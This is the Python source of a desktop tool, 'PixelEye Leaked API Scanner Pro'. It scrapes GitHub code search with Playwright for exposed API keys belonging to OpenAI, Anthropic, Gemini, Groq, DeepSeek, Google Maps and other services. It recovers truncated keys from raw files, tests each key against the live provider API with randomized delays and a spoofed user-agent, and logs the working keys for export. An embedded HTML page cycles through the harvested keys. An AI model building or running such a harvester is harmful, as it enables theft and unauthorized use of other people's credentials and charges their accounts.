import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import asyncio
import re
import os
import time
import json
import random
import sys
import io
import shutil
import webbrowser
import tempfile
from concurrent.futures import ThreadPoolExecutor
from playwright.async_api import async_playwright
import requests

# ==============================================================================
# DESIGN SYSTEM (PREMIUM DARK NEON)
# ==============================================================================
COLORS = {
    "bg": "#0f172a",          # Deep Navy
    "card_bg": "#1e293b",     # Slate
    "accent": "#38bdf8",     # Sky Blue
    "success": "#10b981",    # Emerald
    "danger": "#f43f5e",     # Rose
    "warning": "#fbbf24",    # Amber
    "text": "#f8fafc",       # Ghost White
    "text_muted": "#94a3b8", # Blue Gray
    "border": "#334155"      # Dark Slate
}

FONTS = {
    "header": ("Inter", 22, "bold"),
    "sub_header": ("Inter", 12, "bold"),
    "body": ("Inter", 10),
    "mono": ("JetBrains Mono", 10)
}

# ==============================================================================
# EMBEDDED API TESTER HTML (Self-Contained)
# ==============================================================================
INTERNAL_TESTER_HTML = """<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PixelEye API Tester</title>
    <style>
        body { font-family: sans-serif; margin: 20px; background-color: #f9f9f9; }
        .tester-section { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); margin-bottom: 30px; }
        h2 { margin-top: 0; color: #2c3e50; border-bottom: 2px solid #ecf0f1; padding-bottom: 10px; }
        #map { height: 400px; width: 100%; border: 1px solid #ccc; margin-top: 10px; background-color: #eaeaea; display: flex; align-items: center; justify-content: center; color: #7f8c8d; }
        .controls { margin-bottom: 15px; padding: 15px; background: #f4f4f4; border-radius: 5px; display: flex; align-items: center; flex-wrap: wrap; gap: 10px; }
        .key-input-area { background: #e1f5fe; border: 1px dashed #0288d1; flex-direction: column; align-items: flex-start; }
        .input-row { display: flex; gap: 10px; align-items: center; width: 100%; flex-wrap: wrap; }
        .controls input[type="text"] { padding: 8px; border: 1px solid #bdc3c7; border-radius: 4px; }
        .controls input.long-input { width: 300px; }
        .controls input[type="file"] { font-size: 14px; }
        .controls button { padding: 8px 15px; cursor: pointer; border: none; border-radius: 4px; font-weight: bold; transition: background 0.2s; }
        .btn-primary { background-color: #27ae60; color: white; }
        .btn-secondary { background-color: #2980b9; color: white; }
        .btn-weather { background-color: #e67e22; color: white; }
        .btn-add { background-color: #8e44ad; color: white; }
        .btn-danger { background-color: #e74c3c; color: white; }
        .status-box { padding: 12px; margin-top: 10px; background: #e8f4f8; border-left: 5px solid #2980b9; font-family: monospace; font-size: 14px; line-height: 1.5; white-space: pre-wrap; }
        .key-text { background: #d1ecf1; padding: 2px 6px; border-radius: 3px; color: #0c5460; font-weight: bold; }
        .counter { font-size: 13px; color: #555; font-weight: bold; margin-left: auto; }
    </style>
</head>
<body>
    <div class="tester-section">
        <h2>🗺️ Google Maps API Tester</h2>
        <div class="controls key-input-area">
            <b>Add Map Key(s)</b>
            <div class="input-row">
                <span>Manual:</span> <input id="new-map-key" class="long-input" type="text" placeholder='["key1", "key2"]' />
            </div>
            <div class="input-row">
                <span>File (.txt):</span> <input id="map-file" type="file" accept=".txt" />
                <button class="btn-add" onclick="addMapKeys()">Process Keys</button>
                <button class="btn-danger" onclick="clearMapKeys()">Clear</button>
                <span class="counter" id="map-key-count">0 keys loaded</span>
            </div>
        </div>
        <div class="controls">
            <b>From:</b> <input id="origin" type="text" value="London, UK" />
            <b>To:</b> <input id="destination" type="text" value="Manchester, UK" />
            <button class="btn-primary" onclick="triggerRouteCalculation()">Get Directions</button>
            <button class="btn-secondary" onclick="loadPreviousMapKey()">⏮ Prev</button>
            <button class="btn-secondary" onclick="loadNextMapKey()">Next ⏭</button>
        </div>
        <div id="map-status-box" class="status-box">Status: Waiting for Keys...</div>
        <div id="map">Map will load here.</div>
    </div>
    <div class="tester-section">
        <h2>⛅ OpenWeatherMap API Tester</h2>
        <div class="controls key-input-area">
            <b>Add Weather Key(s)</b>
            <div class="input-row">
                <span>Manual:</span> <input id="new-weather-key" class="long-input" type="text" placeholder='["key1"]' />
            </div>
            <div class="input-row">
                <span>File (.txt):</span> <input id="weather-file" type="file" accept=".txt" />
                <button class="btn-add" onclick="addWeatherKeys()">Process Keys</button>
                <button class="btn-danger" onclick="clearWeatherKeys()">Clear</button>
                <span class="counter" id="weather-key-count">0 keys loaded</span>
            </div>
        </div>
        <div class="controls">
            <b>City:</b> <input id="weather-city" type="text" value="London" />
            <button class="btn-weather" onclick="testWeatherKey()">Test Weather</button>
            <button class="btn-secondary" onclick="loadPreviousWeatherKey()">⏮ Prev</button>
            <button class="btn-secondary" onclick="loadNextWeatherKey()">Next ⏭</button>
        </div>
        <div id="weather-status-box" class="status-box">Status: Waiting for Keys...</div>
    </div>
    <script>
        async function extractKeysFromInputs(textInputId, fileInputId) {
            let extractedKeys = [];
            const textVal = document.getElementById(textInputId).value.trim();
            const fileInput = document.getElementById(fileInputId);
            if (textVal) { try { const parsedText = JSON.parse(textVal); if (Array.isArray(parsedText)) extractedKeys.push(...parsedText); } catch (e) { alert("Format Error: ['key1']"); } }
            if (fileInput.files.length > 0) { try { const file = fileInput.files[0]; const fileText = await file.text(); const parsedFile = JSON.parse(fileText.trim()); if (Array.isArray(parsedFile)) extractedKeys.push(...parsedFile); } catch (e) { alert("File Format Error"); } }
            return extractedKeys.map(k => String(k).trim()).filter(k => k !== "");
        }
        let mapApiKeys = []; let currentMapKeyIndex = 0; let map; let directionsService; let directionsRenderer;
        async function addMapKeys() {
            const newKeys = await extractKeysFromInputs("new-map-key", "map-file");
            if (newKeys.length > 0) {
                const wasEmpty = mapApiKeys.length === 0; mapApiKeys.push(...newKeys);
                document.getElementById("map-key-count").innerText = `${mapApiKeys.length} keys loaded`;
                if (wasEmpty) loadMapsScript();
            }
        }
        function clearMapKeys() { mapApiKeys = []; currentMapKeyIndex = 0; document.getElementById("map-key-count").innerText = `0 keys`; document.getElementById("map").innerHTML = "Map will load here."; }
        function updateMapStatus(message, color = "#333") {
            const sb = document.getElementById("map-status-box"); sb.style.borderLeftColor = color;
            if (mapApiKeys.length === 0) { sb.innerHTML = `Status: ${message}`; return; }
            sb.innerHTML = `Active Key: <span class="key-text">${mapApiKeys[currentMapKeyIndex]}</span> (${currentMapKeyIndex + 1}/${mapApiKeys.length})<br>Status: ${message}`;
        }
        function loadMapsScript() {
            const os = document.getElementById("gmaps-script"); if (os) os.remove();
            const script = document.createElement("script"); script.id = "gmaps-script";
            script.src = `https://maps.googleapis.com/maps/api/js?key=${mapApiKeys[currentMapKeyIndex]}&callback=initMap`;
            script.onerror = () => updateMapStatus("Error: Key may be invalid.", "#c0392b");
            document.head.appendChild(script);
        }
        function loadNextMapKey() { if (mapApiKeys.length) { currentMapKeyIndex = (currentMapKeyIndex + 1) % mapApiKeys.length; loadMapsScript(); } }
        function loadPreviousMapKey() { if (mapApiKeys.length) { currentMapKeyIndex = (currentMapKeyIndex - 1 + mapApiKeys.length) % mapApiKeys.length; loadMapsScript(); } }
        window.initMap = function() {
            document.getElementById("map").innerHTML = ""; map = new google.maps.Map(document.getElementById("map"), { zoom: 7, center: { lat: 34, lng: -118 }});
            directionsService = new google.maps.DirectionsService(); directionsRenderer = new google.maps.DirectionsRenderer(); directionsRenderer.setMap(map);
            updateMapStatus("Map Ready", "#27ae60");
        };
        function triggerRouteCalculation() {
            const start = document.getElementById("origin").value; const end = document.getElementById("destination").value;
            directionsService.route({ origin: start, destination: end, travelMode: google.maps.TravelMode.DRIVING }, (res, status) => {
                if (status === "OK") { directionsRenderer.setDirections(res); updateMapStatus("✔ Route Success!", "#27ae60"); }
                else { updateMapStatus(`✘ Failed: ${status}`, "#c0392b"); }
            });
        }
        let weatherApiKeys = []; let currentWeatherKeyIndex = 0;
        async function addWeatherKeys() {
            const nk = await extractKeysFromInputs("new-weather-key", "weather-file");
            if (nk.length > 0) { weatherApiKeys.push(...nk); document.getElementById("weather-key-count").innerText = `${weatherApiKeys.length} loaded`; updateWeatherStatus("Ready"); }
        }
        function clearWeatherKeys() { weatherApiKeys = []; currentWeatherKeyIndex = 0; document.getElementById("weather-key-count").innerText = "0 loaded"; updateWeatherStatus("Waiting..."); }
        function updateWeatherStatus(msg, col="#333") {
            const sb = document.getElementById("weather-status-box"); sb.style.borderLeftColor = col;
            if (!weatherApiKeys.length) { sb.innerHTML = `Status: ${msg}`; return; }
            sb.innerHTML = `Active Key: <span class="key-text">${weatherApiKeys[currentWeatherKeyIndex]}</span><br>Status: ${msg}`;
        }
        function loadNextWeatherKey() { if (weatherApiKeys.length) { currentWeatherKeyIndex = (currentWeatherKeyIndex + 1) % weatherApiKeys.length; updateWeatherStatus("Switched"); } }
        function loadPreviousWeatherKey() { if (weatherApiKeys.length) { currentWeatherKeyIndex = (currentWeatherKeyIndex - 1 + weatherApiKeys.length) % weatherApiKeys.length; updateWeatherStatus("Switched"); } }
        async function testWeatherKey() {
            const city = document.getElementById("weather-city").value; const key = weatherApiKeys[currentWeatherKeyIndex];
            try {
                const res = await fetch(`https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${key}&units=metric`);
                const data = await res.json();
                if (res.ok) updateWeatherStatus(`✔ Success! Temp in ${data.name}: ${data.main.temp}°C`, "#27ae60");
                else updateWeatherStatus(`✘ Rejected: ${data.message}`, "#c0392b");
            } catch (e) { updateWeatherStatus("Network Error", "#c0392b"); }
        }
    </script>
</body>
</html>"""

# ==============================================================================
# GITHUB SEARCH DEFAULTS
# ==============================================================================
DEFAULT_FILE_PATHS = "(path:*.xml+OR+path:*.json+OR+path:*.properties+OR+path:*.sql+OR+path:*.txt+OR+path:*.log+OR+path:*.tmp+OR+path:*.backup+OR+path:*.bak+OR+path:*.enc+OR+path:*.yml+OR+path:*.yaml+OR+path:*.toml+OR+path:*.ini+OR+path:*.config+OR+path:*.conf+OR+path:*.cfg+OR+path:*.env+OR+path:*.envrc+OR+path:*.prod+OR+path:*.secret+OR+path:*.private+OR+path:*.key)"
DEFAULT_SYNONYMS = "(access_key+OR+secret_key+OR+access_token+OR+api_key+OR+apikey+OR+api_secret+OR+apiSecret+OR+app_secret+OR+application_key+OR+app_key+OR+appkey+OR+auth_token+OR+authsecret)"
SEARCH_SUFFIX = "&type=code"

CONFIG_FILE = "presets.json"

DEFAULT_PRESETS = {
    "gemini": {
        "keywords": "(AIza+AND+gemini)",
        "prefix": "AIza",
        "length": 39,
        "test_url": "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={key}",
        "method": "POST",
        "payload": {"contents": [{"parts": [{"text": "Hello"}]}]},
    },
    "chatgpt": {
        "keywords": "(sk-+AND+openai)",
        "prefix": "sk-",
        "length": 164,
        "test_url": "https://api.openai.com/v1/models",
        "method": "GET",
        "payload": None,
    },
    "claude": {
        "keywords": "(sk-ant-api03-+AND+anthropic)",
        "prefix": "sk-ant-api03-",
        "length": 108,
        "test_url": "https://api.anthropic.com/v1/messages",
        "method": "POST",
        "synonyms": "(anthropic_key+OR+claude_api_key)",
        "custom_headers": {"anthropic-version": "2023-06-01", "x-api-key": "{key}"},
        "payload": {
            "model": "claude-3-haiku-20240307",
            "max_tokens": 1,
            "messages": [{"role": "user", "content": [{"type": "text", "text": "Hi"}]}],
        },
    },
    "groq": {
        "keywords": "(gsk_+AND+groq)",
        "prefix": "gsk_",
        "length": 56,
        "test_url": "https://api.groq.com/openai/v1/chat/completions",
        "method": "POST",
        "payload": {
            "model": "llama-3.3-70b-versatile",
            "messages": [{"role": "user", "content": "Explain the importance of fast language models"}],
        },
    },
    "mistral": {
        "keywords": "(sk-+AND+mistral)",
        "prefix": "sk-",
        "length": 30,
        "test_url": "https://api.mistral.ai/v1/models",
        "method": "GET",
        "payload": None,
    },
    "perplexity": {
        "keywords": "(pplx-+AND+perplexity)",
        "prefix": "pplx-",
        "length": 40,
        "test_url": "https://api.perplexity.ai/models",
        "method": "GET",
        "payload": None,
    },
    "deepseek": {
        "keywords": "(sk-+AND+deepseek)",
        "prefix": "sk-",
        "length": 32,
        "test_url": "https://api.deepseek.com/chat/completions",
        "method": "POST",
        "payload": {"model": "deepseek-chat", "messages": [{"role": "user", "content": "Hi"}], "max_tokens": 1},
    },
    "google_maps": {
        "keywords": "(AIzaSy+AND+maps)",
        "prefix": "AIzaSy",
        "length": 39,
        "test_url": "https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood&key={key}",
        "method": "GET",
        "payload": None,
    },
    "openweathermap": {
        "keywords": "(openweathermap+AND+api_key)",
        "prefix": "",
        "length": 32,
        "test_url": "https://api.openweathermap.org/data/2.5/weather?q=London&appid={key}",
        "method": "GET",
        "payload": None,
    },
}

def load_presets():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except:
            return DEFAULT_PRESETS
    return DEFAULT_PRESETS

def save_presets(presets):
    with open(CONFIG_FILE, "w") as f:
        json.dump(presets, f, indent=4)

class PrintRedirector:
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, str):
        self.text_widget.after(0, self.append_text, str)

    def append_text(self, str):
        self.text_widget.configure(state='normal')
        
        # Color coding tags
        tag = None
        if "[+]" in str or "VALID" in str: tag = "success"
        elif "[-]" in str or "INVALID" in str or "Error" in str: tag = "danger"
        elif "[*]" in str: tag = "info"
        elif "[!]" in str: tag = "warning"

        self.text_widget.insert(tk.END, str, tag)
        self.text_widget.see(tk.END)
        self.text_widget.configure(state='disabled')

    def flush(self):
        pass

class APIScanner:
    def __init__(self, config):
        self.config = config
        self.target_url = config.get("target_url")
        self.prefix = config.get("prefix", "")
        self.length = int(config.get("length", 40))
        self.test_url = config.get("test_url")
        self.method = config.get("method", "POST")
        self.payload = config.get("payload")
        self.results_file = config.get("results_file", "valid_keys.txt")
        self.session_dir = os.path.join(os.getcwd(), ".playwright_session")
        self.stop_requested = False # Flag for cancellation
        
        if self.prefix:
            self.regex_base = re.compile(rf"{re.escape(self.prefix)}[a-zA-Z0-9_\-:]+")
        else:
            self.regex_base = re.compile(r"[a-fA-F0-9]{32}")

    async def fetch_page_content(self, context, url):
        page = await context.new_page()
        try:
            print(f"[*] Navigating to GitHub Search...")
            await page.goto(url, wait_until="domcontentloaded", timeout=90000)
            # ...

            if "github.com/login" in page.url or await page.query_selector("input[name='login']"):
                print("[!] Action Required: Please log in via the browser window.")
                await page.wait_for_selector("div.codesearch-results, div[data-testid='results-list']", timeout=0)
                await asyncio.sleep(2)

            results = await page.evaluate("""() => {
                const data = [];
                let items = document.querySelectorAll('div[data-testid="results-list"] > div, .code-list-item');
                if (items.length === 0) items = document.querySelectorAll('.Box-row, .code-list-item');
                items.forEach(item => {
                    const text = item.innerText;
                    const fileLink = item.querySelector('a[href*="/blob/"]');
                    if (fileLink) {
                        data.push({ text: text, url: fileLink.href });
                    }
                });
                return data;
            }""")
            # If we couldn't find structured results, return the whole page as a fallback
            if not results:
                text_content = await page.evaluate("document.body.innerText")
                return [{"text": text_content, "url": None}]
                
            return results
        except Exception as e:
            if "Target page, context or browser has been closed" in str(e):
                return []
            print(f"[!] Browser communication interrupted: {e}")
            return []
        finally:
            try:
                await page.close()
            except:
                pass

    def extract_keys(self, html):
        if not html: return []
        candidates = self.regex_base.findall(html)
        keys = set()
        for cand in candidates:
            is_claude = self.prefix == "sk-ant-api03-"
            is_openai = self.prefix == "sk-"
            if len(cand) >= self.length:
                keys.add(cand)
            elif (is_claude and len(cand) > 20) or (is_openai and len(cand) > 40):
                keys.add(cand)
        return list(keys)

    async def fetch_full_key(self, context, file_url):
        raw_url = file_url.replace("/blob/", "/raw/")
        print(f"[*] Deep scanning truncated key from: {raw_url}")
        page = await context.new_page()
        try:
            await page.goto(raw_url, wait_until="domcontentloaded", timeout=60000)
            text = await page.evaluate("document.body.innerText")
            full_keys = self.extract_keys(text)
            for k in full_keys:
                if len(k) >= self.length:
                    return k
        except Exception:
            # Silently handle browser closure during deep scan
            return None
        finally:
            try:
                await page.close()
            except:
                pass
        return None

    def test_key(self, key):
        if self.stop_requested: return False
        if not self.test_url: return False
        time.sleep(random.uniform(0.5, 2))
        try:
            url = self.test_url.replace("{key}", key) if "{key}" in self.test_url else self.test_url
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chromium/120"}
            custom_headers = self.config.get("custom_headers")
            if custom_headers:
                for h, v in custom_headers.items(): headers[h] = v.replace("{key}", key)
            elif "{key}" not in self.test_url:
                headers["Authorization"] = f"Bearer {key}"
                
            resp = requests.post(url, headers=headers, json=self.payload, timeout=12) if self.method == "POST" else requests.get(url, headers=headers, timeout=12)
            
            if resp.status_code == 200:
                print(f"[+] VALID KEY DISCOVERED: {key}")
                self.save_valid_key(key)
                return True
            else:
                trunc_key = f"{key[:15]}...{key[-5:]}" if len(key) > 20 else key
                try:
                    error = resp.json().get("error", {}).get("message", "Invalid")
                    print(f"[-] INVALID ({resp.status_code}): {trunc_key} - {error}")
                    lower_err = error.lower()
                    if resp.status_code == 429 or "quota" in lower_err:
                        self.save_valid_key(key, "Quota Exceeded")
                    elif any(word in lower_err for word in ["balance", "billing", "restricted", "disabled"]):
                        self.save_valid_key(key, f"Account Issue: {error[:30]}...")
                except:
                    print(f"[-] INVALID ({resp.status_code}): {trunc_key}")
                return False
        except Exception as e:
            print(f"[x] Connection Error for {key[:15]}: {e}")
            return False

    def save_valid_key(self, key, note="Working"):
        with open(self.results_file, "a") as f:
            f.write(f"{key} | {note} | Found: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    async def run(self):
        pages_to_scan = self.config.get("pages", 1)
        all_keys = set()
        valid_count = 0
        invalid_count = 0

        async with async_playwright() as p:
            browser_context = await p.chromium.launch_persistent_context(
                self.session_dir, headless=not self.config.get("interactive"),
                args=["--disable-gpu", "--no-sandbox", "--window-size=1280,720"]
            )
            try:
                for p_idx in range(1, pages_to_scan + 1):
                    if self.stop_requested:
                        print("[!] Scan aborted by user.")
                        break
                        
                    current_url = self.target_url + (f"&p={p_idx}" if "?" in self.target_url else f"?p={p_idx}")
                    print(f"[*] Analyzing Search Page {p_idx}/{pages_to_scan}...")
                    
                    page_key_count = 0
                    results_data = await self.fetch_page_content(browser_context, current_url)
                    
                    if results_data:
                        for item in results_data:
                            page_keys = self.extract_keys(item['text'])
                            for k in page_keys:
                                page_key_count += 1
                                is_truncated = (self.prefix == "sk-ant-api03-" and len(k) < 108) or (self.prefix == "sk-" and 40 < len(k) < 164)
                                if is_truncated and item['url']:
                                    full_k = await self.fetch_full_key(browser_context, item['url'])
                                    all_keys.add(full_k if full_k else k)
                                else:
                                    all_keys.add(k)
                        
                        print(f"[+] Page {p_idx}: Identified {page_key_count} potential tokens.")
                        
                    if p_idx < pages_to_scan: await asyncio.sleep(random.uniform(2, 4))
            except Exception as e:
                if "Target page, context or browser has been closed" not in str(e):
                    print(f"[x] Critical Browser Error: {e}")
            finally:
                try:
                    await browser_context.close()
                except:
                    pass

        if all_keys and not self.stop_requested:
            print(f"[*] Starting validation for {len(all_keys)} unique tokens...")
            with ThreadPoolExecutor(max_workers=5) as executor:
                # We use a wrapper to track valid/invalid counts
                future_to_key = {executor.submit(self.test_key, k): k for k in all_keys}
                for future in future_to_key:
                    if self.stop_requested: break
                    if future.result():
                        valid_count += 1
                    else:
                        invalid_count += 1

        print("-" * 50)
        print(f"[*] OPERATION SUMMARY")
        print(f"[*] Total Unique Tokens Found: {len(all_keys)}")
        print(f"[*] VALID KEYS: {valid_count}")
        print(f"[*] INVALID KEYS: {invalid_count}")
        if self.stop_requested: print("[!] Note: Operation was cancelled early.")
        print("-" * 50)

class ScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("PixelEye Leaked API Scanner Pro")
        self.root.geometry("1000x800")
        self.root.configure(bg=COLORS["bg"])
        
        self.presets = load_presets()
        self.init_styles()
        self.build_ui()

    def init_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        
        # Force uniform background across the app
        style.configure("TFrame", background=COLORS["bg"])
        style.configure("Card.TFrame", background=COLORS["card_bg"])
        style.configure("TLabel", background=COLORS["bg"], foreground=COLORS["text"], font=FONTS["body"])
        
        # Fix Combobox background and foreground
        style.map("TCombobox", fieldbackground=[("readonly", COLORS["card_bg"])])
        style.configure("TCombobox", 
            fieldbackground=COLORS["card_bg"], 
            background=COLORS["border"], 
            foreground="white",
            arrowcolor="white"
        )

    def build_ui(self):
        # Header Area
        header_frame = tk.Frame(self.root, bg=COLORS["bg"], height=100)
        header_frame.pack(fill=tk.X, padx=30, pady=(30, 10))
        
        tk.Label(header_frame, text="PIXELEYE", bg=COLORS["bg"], fg=COLORS["accent"], font=("Inter", 24, "bold")).pack(side=tk.LEFT)
        tk.Label(header_frame, text="LEAKED API SCANNER PRO", bg=COLORS["bg"], fg=COLORS["text_muted"], font=("Inter", 12, "bold")).pack(side=tk.LEFT, padx=10, pady=8)
        
        # Open Tester Button
        tk.Button(header_frame, text="🛠️ OPEN API TESTER", bg=COLORS["card_bg"], fg=COLORS["accent"], bd=0, font=FONTS["body"], padx=15, command=self.open_api_tester, cursor="hand2").pack(side=tk.LEFT, padx=20)

        # Stats / Status
        stats_frame = tk.Frame(header_frame, bg=COLORS["bg"])
        stats_frame.pack(side=tk.RIGHT)
        
        self.status_indicator = tk.Label(stats_frame, text="SYSTEM READY", bg=COLORS["bg"], fg=COLORS["success"], font=FONTS["sub_header"])
        self.status_indicator.pack(side=tk.RIGHT)
        
        # Main Layout (ensure background consistency)
        container = tk.Frame(self.root, bg=COLORS["bg"], padx=30, pady=10)
        container.pack(fill=tk.BOTH, expand=True)
        
        # Card: Configuration
        config_card = tk.Frame(container, bg=COLORS["card_bg"], bd=1, relief="flat", highlightthickness=1)
        config_card.configure(highlightbackground=COLORS["border"])
        config_card.pack(fill=tk.X, pady=(0, 20), ipadx=20, ipady=20)
        
        # Inner grid
        controls = tk.Frame(config_card, bg=COLORS["card_bg"])
        controls.pack(fill=tk.X, padx=10)
        
        # Service Selection
        tk.Label(controls, text="TARGET SERVICE", bg=COLORS["card_bg"], fg=COLORS["text_muted"], font=FONTS["sub_header"]).grid(row=0, column=0, sticky=tk.W, padx=10, pady=(10,0))
        self.service_var = tk.StringVar()
        self.service_menu = ttk.Combobox(controls, textvariable=self.service_var, values=list(self.presets.keys()), state="readonly", width=25)
        self.service_menu.grid(row=1, column=0, padx=10, pady=(5,10))
        if self.presets: self.service_menu.current(0)
        
        # Page Selection
        tk.Label(controls, text="DEPTH (PAGES)", bg=COLORS["card_bg"], fg=COLORS["text_muted"], font=FONTS["sub_header"]).grid(row=0, column=1, sticky=tk.W, padx=10, pady=(10,0))
        self.pages_var = tk.StringVar(value="5")
        tk.Entry(controls, textvariable=self.pages_var, width=10, bg=COLORS["bg"], fg="white", insertbackground="white", bd=0, highlightthickness=1, highlightbackground=COLORS["border"]).grid(row=1, column=1, padx=10, pady=(5,10), ipady=4)
        
        # Settings Button
        self.manage_btn = tk.Button(controls, text="⚙️ MANAGE", bg=COLORS["card_bg"], fg=COLORS["accent"], activebackground=COLORS["card_bg"], activeforeground="white", bd=0, font=FONTS["body"], command=self.open_presets_manager, cursor="hand2")
        self.manage_btn.grid(row=1, column=2, padx=10, pady=(5,10))
        
        # Mode
        self.headless_var = tk.BooleanVar(value=False)
        tk.Checkbutton(controls, text="STEALTH MODE", variable=self.headless_var, bg=COLORS["card_bg"], fg=COLORS["text_muted"], selectcolor=COLORS["bg"], activebackground=COLORS["card_bg"], activeforeground="white", bd=0).grid(row=1, column=3, padx=20, pady=(5,10))
        
        # Action Buttons
        button_group = tk.Frame(controls, bg=COLORS["card_bg"])
        button_group.grid(row=1, column=4, padx=10, sticky=tk.E)
        
        # Using tk.Button for full control over colors on all platforms
        self.start_btn = tk.Button(button_group, text="INITIATE SCAN", bg=COLORS["accent"], fg=COLORS["bg"], activebackground=COLORS["success"], font=FONTS["sub_header"], bd=0, padx=20, pady=8, command=self.handle_action_btn, cursor="hand2")
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.download_btn = tk.Button(button_group, text="📥 DOWNLOAD", bg=COLORS["border"], fg="white", activebackground=COLORS["accent"], font=FONTS["body"], bd=0, padx=15, pady=8, command=self.show_download_options, cursor="hand2")
        self.download_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(button_group, text="🗑️ CLEAR", bg=COLORS["danger"], fg="white", activebackground=COLORS["accent"], font=FONTS["body"], bd=0, padx=15, pady=8, command=self.clear_results, cursor="hand2")
        self.clear_btn.pack(side=tk.LEFT, padx=5)

        self.current_scanner = None
        self.is_running = False
        
        # Download Menu
        self.download_menu = tk.Menu(self.root, tearoff=0, bg=COLORS["card_bg"], fg="white", activebackground=COLORS["accent"], activeforeground=COLORS["bg"], font=FONTS["body"], bd=0)
        self.download_menu.add_command(label="📊 Export as Excel (CSV)", command=lambda: self.download_results("excel"))
        self.download_menu.add_command(label="📦 Export as JSON Array", command=lambda: self.download_results("array"))
        self.download_menu.add_command(label="📄 Export as Standard Text", command=lambda: self.download_results("text"))

        # Card: Terminal Output
        output_label_frame = tk.Frame(container, bg=COLORS["bg"])
        output_label_frame.pack(fill=tk.X, pady=(10, 5))
        tk.Label(output_label_frame, text="SYSTEM TERMINAL", bg=COLORS["bg"], fg=COLORS["text_muted"], font=FONTS["sub_header"]).pack(side=tk.LEFT)
        
        self.console = scrolledtext.ScrolledText(container, bg="#000000", fg="#d4d4d4", font=("JetBrains Mono", 11), state='disabled', borderwidth=0, highlightthickness=1, highlightbackground=COLORS["border"])
        self.console.pack(fill=tk.BOTH, expand=True)
        
        # Console Tags
        self.console.tag_config("success", foreground=COLORS["success"])
        self.console.tag_config("danger", foreground=COLORS["danger"])
        self.console.tag_config("info", foreground=COLORS["accent"])
        self.console.tag_config("warning", foreground=COLORS["warning"])

        sys.stdout = PrintRedirector(self.console)
        print("[*] SYSTEM INITIALIZED. WELCOME TO PIXELEYE.")

    def open_presets_manager(self):
        manager = tk.Toplevel(self.root)
        manager.title("Preset Configuration")
        manager.geometry("700x700")
        manager.configure(bg=COLORS["bg"])
        
        # Form Variables
        name_var = tk.StringVar()
        keywords_var = tk.StringVar()
        prefix_var = tk.StringVar()
        length_var = tk.StringVar()
        test_url_var = tk.StringVar()
        method_var = tk.StringVar(value="POST")
        payload_var = tk.StringVar()
        synonyms_var = tk.StringVar()

        def on_select_preset(evt):
            w = evt.widget
            if not w.curselection(): return
            idx = int(w.curselection()[0])
            name = w.get(idx)
            p = self.presets[name]
            name_var.set(name)
            keywords_var.set(p.get("keywords", ""))
            prefix_var.set(p.get("prefix", ""))
            length_var.set(str(p.get("length", "")))
            test_url_var.set(p.get("test_url", ""))
            method_var.set(p.get("method", "POST"))
            payload_var.set(json.dumps(p.get("payload")))
            synonyms_var.set(p.get("synonyms", ""))

        list_frame = tk.Frame(manager, bg=COLORS["card_bg"], width=200)
        list_frame.pack(side=tk.LEFT, fill=tk.Y, padx=20, pady=20)
        
        lb = tk.Listbox(list_frame, bg=COLORS["bg"], fg="white", font=FONTS["body"], borderwidth=0, highlightthickness=1, highlightbackground=COLORS["border"], selectbackground=COLORS["accent"])
        lb.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        for p in self.presets: lb.insert(tk.END, p)
        lb.bind('<<ListboxSelect>>', on_select_preset)

        form_frame = tk.Frame(manager, bg=COLORS["bg"], padx=20, pady=20)
        form_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        def add_field(label, var):
            tk.Label(form_frame, text=label.upper(), bg=COLORS["bg"], fg=COLORS["text_muted"], font=FONTS["sub_header"]).pack(anchor=tk.W, pady=(10, 0))
            tk.Entry(form_frame, textvariable=var, width=50, bg=COLORS["card_bg"], fg="white", bd=0, highlightthickness=1, highlightbackground=COLORS["border"]).pack(fill=tk.X, pady=5, ipady=4)

        add_field("Service Identifier", name_var)
        add_field("GitHub Query Keywords", keywords_var)
        add_field("Key Prefix Pattern", prefix_var)
        add_field("Target Key Length", length_var)
        add_field("Verification Endpoint", test_url_var)
        
        tk.Label(form_frame, text="HTTP REQUEST METHOD", bg=COLORS["bg"], fg=COLORS["text_muted"], font=FONTS["sub_header"]).pack(anchor=tk.W, pady=(10, 0))
        ttk.Combobox(form_frame, textvariable=method_var, values=["GET", "POST"], state="readonly").pack(fill=tk.X, pady=5)
        
        add_field("JSON Validation Payload", payload_var)
        add_field("Search Synonyms Overrides", synonyms_var)
        
        def copy_default_synonyms():
            synonyms_var.set(DEFAULT_SYNONYMS)
            
        tk.Button(form_frame, text="📋 USE GLOBAL DEFAULT SYNONYMS", bg=COLORS["border"], fg="white", bd=0, command=copy_default_synonyms).pack(fill=tk.X, pady=5)

        def save_preset_btn():
            name = name_var.get().strip()
            if not name: return
            try:
                payload_str = payload_var.get().strip()
                payload = json.loads(payload_str) if payload_str and payload_str != "null" else None
                self.presets[name] = {
                    "keywords": keywords_var.get(),
                    "prefix": prefix_var.get(),
                    "length": int(length_var.get()),
                    "test_url": test_url_var.get(),
                    "method": method_var.get(),
                    "payload": payload,
                    "synonyms": synonyms_var.get() if synonyms_var.get() else None
                }
                save_presets(self.presets)
                self.service_menu['values'] = list(self.presets.keys())
                lb.delete(0, tk.END)
                for p in self.presets: lb.insert(tk.END, p)
                messagebox.showinfo("Success", f"'{name}' configuration persisted.")
            except Exception as e:
                messagebox.showerror("Configuration Error", f"Validation failed: {e}")

        def delete_preset_btn():
            name = name_var.get().strip()
            if name in self.presets:
                if messagebox.askyesno("Confirm Deletion", f"Permanently remove '{name}'?"):
                    del self.presets[name]
